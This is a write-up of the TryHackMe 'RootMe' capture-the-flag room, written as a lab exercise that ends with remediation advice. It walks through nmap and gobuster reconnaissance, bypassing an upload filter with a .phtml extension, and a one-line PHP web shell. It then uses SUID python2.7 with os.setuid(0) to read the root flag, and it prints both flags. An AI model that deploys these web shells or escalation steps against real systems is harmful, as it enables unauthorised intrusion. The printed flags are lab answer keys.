# Write-Up: RootMe - TryHackMe

* **Difficulty:** Easy
* **OS:** Linux
* **Platform:** TryHackMe
* **Category:** Web / Privilege Escalation

## Summary
An initial web scan revealed an Apache HTTP server with an unrestricted file upload vulnerability. After facing initial hurdles with standard reverse shells and file handling, the methodology was pivoted to a lightweight single-line PHP web shell (.phtml) to achieve Arbitrary Command Execution (ACE). Privilege escalation was successfully executed by abusing a SUID-configured Python 2.7 binary to obtain root privileges.

### 1. Reconnaissance & Enumeration
Port Scanning (Nmap)
An initial port scan was conducted to identify active services on the target machine.

```bash
nmap -sCV -p- --min-rate 5000 10.67.181.67 -oN nmap_result.txt
```

## Open Ports:
- 22/tcp - SSH (OpenSSH)
- 80/tcp - HTTP (Apache 2.4.41)

<img width="846" height="431" alt="scan1" src="https://github.com/user-attachments/assets/3bbb8758-db32-426a-b455-fb081b8fd7e5" />

## Why this command?
-sCV performs version detection and runs default NSE scripts to gather service information, and -p- scans all 65,535 ports to ensure no service is missed.

## Web Directory Discovery (Gobuster)
Directory brute-forcing was executed to discover hidden paths on the web server:

```bash
gobuster dir -u http://10.67.181.67/ -w /usr/share/wordlists/dirb/common.txt
```

## Discovered Paths:
- /panel/ - File upload form interface.
- /uploads/ - Directory where uploaded files are stored and served.

<img width="658" height="473" alt="Gobusterscreenshot" src="https://github.com/user-attachments/assets/87de0458-0dc9-4e2f-95dc-12f94c62a35a" />

## Why this command?
gobuster floods the target web server with HTTP requests using a wordlist in this case (common.txt) to uncover hidden directorie.

## 2. Initial Access & Exploitation (Troubleshooting & Adaptation)

### The Challenge with Standard Shells
Initially, a standard PHP reverse shell script was tested. However, due to file renaming and transfer hurdles in the environment, the standard script failed to deploy correctly. Instead of stopping, the methodology was adapted to a lightweight approach.
Upload Filter Bypass & Web Shell Deployment
1. Bypassing filters: The application blocked standard .php extensions. Changing the extension to .phtml successfully bypassed the filter, allowing the server to parse the file as PHP.
2. Deploying a Mini-Shell: A single-line PHP command execution script (cmd.phtml) was uploaded:
```bash
<?php system($_GET['cmd']); ?>
```
Why this works: The system() function executes a command passed through the URL parameter (?cmd=...) and prints the raw output directly onto the browser screen, serving as an instant web-based terminal.

### 3. User Flag Retrieval:
Accessed via URL: http://10.67.181.67/uploads/cmd.phtml?cmd=cat+/var/www/user.txt

<img width="1041" height="213" alt="user txt" src="https://github.com/user-attachments/assets/f778561a-3b78-45ef-9b35-9ef63894a14e" />

User Flag: THM{you_got_a_sh3ll}

### 3. Privilege Escalation
1. SUID Binary Enumeration: Using the web shell via URL parameters, a search query was executed to locate binaries with the SUID bit enabled:

```bash
find / -perm -4000 -type f 2>/dev/null
```

Why this command? find / searches the entire filesystem, -perm -4000 filters for files with the SUID permission set, and 2>/dev/null suppresses permission error messages for a clean output.

2. Vector Identification: The output revealed that /usr/bin/python2.7 was configured with SUID permissions.

<img width="1268" height="398" alt="SUID1" src="https://github.com/user-attachments/assets/3ea0ed41-bd4a-47b8-be88-1314b1a6ddc3" />

3. Exploitation & Root Access: Leveraging Python's SUID capability, a short script was executed via the web interface to set the process user ID to 0 (root) and read the root flag directly:

```bash
python2.7 -c 'import os; os.setuid(0); print(open("/root/root.txt").read())'
```

Why this works: os.setuid(0) elevates process privileges to root, bypassing standard file permission restrictions to read sensitive system files.

Root Flag: THM{priv1l3g3_3sc4l4t10n}

<img width="1073" height="158" alt="ROOT" src="https://github.com/user-attachments/assets/bbce6259-7349-4d1b-9e6e-e25e2fdc65bd" />

### 4. Remediation & Recommendations
- File Upload Controls: Implement strict MIME-type validation and content inspection instead of solely relying on file extension checks.
- SUID Permissions: Remove unnecessary SUID bits from script interpreters (such as Python) to minimize privilege escalation attack surfaces.



